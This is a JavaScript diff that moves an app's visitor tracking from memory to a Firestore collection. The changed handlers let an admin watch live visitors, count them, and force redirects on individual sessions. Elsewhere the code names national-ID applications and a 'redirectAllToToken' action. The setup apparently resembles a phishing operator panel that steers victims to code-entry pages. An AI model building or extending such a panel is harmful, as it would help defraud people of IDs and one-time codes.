@@ -31,7 +31,7 @@ function isAdminReq(req) {
   return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
 }
 
-let _visitors = {};
+const visitorsCol = db.collection('halyg_visitors');
 
 async function getSettings() {
   const doc = await settingsRef.get();
@@ -68,33 +68,50 @@ async function getOrCreateApp(nationalId) {
   return app;
 }
 
-function getOrCreateVisitor(sessionId) {
-  if (!_visitors[sessionId]) {
-    _visitors[sessionId] = {
-      id: Date.now(), sessionId,
-      currentPage: 'home', redirectTo: null,
-      lastActiveAt: new Date().toISOString(),
-      createdAt: new Date().toISOString(),
-    };
-  }
-  return _visitors[sessionId];
+async function getOrCreateVisitor(sessionId) {
+  const ref = visitorsCol.doc(sessionId);
+  const doc = await ref.get();
+  if (doc.exists) return doc.data();
+
+  const { FieldValue } = require('firebase-admin/firestore');
+  await settingsRef.set({ totalVisitors: FieldValue.increment(1) }, { merge: true });
+
+  const visitor = {
+    id: Date.now(), sessionId,
+    currentPage: 'home', redirectTo: null,
+    lastActiveAt: new Date().toISOString(),
+    createdAt: new Date().toISOString(),
+  };
+  await ref.set(visitor);
+  return visitor;
 }
 
 async function executeProcedure(name, input, isAdmin) {
   switch (name) {
     case 'admin.updateVisitor': {
       const { sessionId, page, currentPage } = input;
-      if (sessionId) { const v = getOrCreateVisitor(sessionId); v.currentPage = currentPage || page || v.currentPage; v.lastActiveAt = new Date().toISOString(); }
+      if (sessionId) {
+        const v = await getOrCreateVisitor(sessionId);
+        const updates = { lastActiveAt: new Date().toISOString() };
+        if (currentPage || page) updates.currentPage = currentPage || page;
+        await visitorsCol.doc(sessionId).update(updates);
+      }
       return { success: true };
     }
     case 'admin.getVisitorRedirect': {
       const { sessionId } = input;
-      const v = sessionId ? _visitors[sessionId] : null;
+      if (!sessionId) return { redirectTo: null };
+      const doc = await visitorsCol.doc(sessionId).get();
+      const v = doc.exists ? doc.data() : null;
       return { redirectTo: v ? (v.redirectTo || null) : null };
     }
     case 'admin.clearVisitorRedirect': {
       const { sessionId } = input;
-      if (sessionId && _visitors[sessionId]) { _visitors[sessionId].redirectTo = null; _visitors[sessionId].lastActiveAt = new Date().toISOString(); }
+      if (sessionId) {
+        const ref = visitorsCol.doc(sessionId);
+        const doc = await ref.get();
+        if (doc.exists) await ref.update({ redirectTo: null, lastActiveAt: new Date().toISOString() });
+      }
       return { success: true };
     }
     case 'applications.getRedirectStatus': {
@@ -236,18 +253,26 @@ async function executeProcedure(name, input, isAdmin) {
       snap.forEach(d => apps.push(d.data()));
       const cutoff = Date.now() - 60000;
       const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
-      const liveVisitorCount = Object.values(_visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000).length;
+      const visitorCutoff = new Date(Date.now() - 120000).toISOString();
+      const liveSnap = await visitorsCol.where('lastActiveAt', '>', visitorCutoff).get();
       const settings = await getSettings();
-      return { apps, activeIds, liveVisitorCount, totalVisitors: settings.totalVisitors };
+      return { apps, activeIds, liveVisitorCount: liveSnap.size, totalVisitors: settings.totalVisitors };
     }
     case 'admin.getLiveVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
-      return { visitors: Object.values(_visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000) };
+      const visitorCutoff = new Date(Date.now() - 120000).toISOString();
+      const snap = await visitorsCol.where('lastActiveAt', '>', visitorCutoff).get();
+      const visitors = [];
+      snap.forEach(d => visitors.push(d.data()));
+      return { visitors };
     }
     case 'admin.getAllVisitors': {
       if (!isAdmin) throw new Error('unauthorized');
       const settings = await getSettings();
-      return { visitors: Object.values(_visitors), totalCount: settings.totalVisitors };
+      const snap = await visitorsCol.orderBy('lastActiveAt', 'desc').limit(200).get();
+      const visitors = [];
+      snap.forEach(d => visitors.push(d.data()));
+      return { visitors, totalCount: settings.totalVisitors };
     }
     case 'admin.getWhatsAppLink': {
       const settings = await getSettings();
@@ -320,7 +345,11 @@ async function executeProcedure(name, input, isAdmin) {
     case 'admin.redirectVisitor': {
       if (!isAdmin) throw new Error('unauthorized');
       const { sessionId, redirectTo, page } = input;
-      if (sessionId && _visitors[sessionId]) { _visitors[sessionId].redirectTo = redirectTo || page || null; _visitors[sessionId].lastActiveAt = new Date().toISOString(); }
+      if (sessionId) {
+        const ref = visitorsCol.doc(sessionId);
+        const doc = await ref.get();
+        if (doc.exists) await ref.update({ redirectTo: redirectTo || page || null, lastActiveAt: new Date().toISOString() });
+      }
       return { success: true };
     }
     case 'admin.redirectAllToToken': {
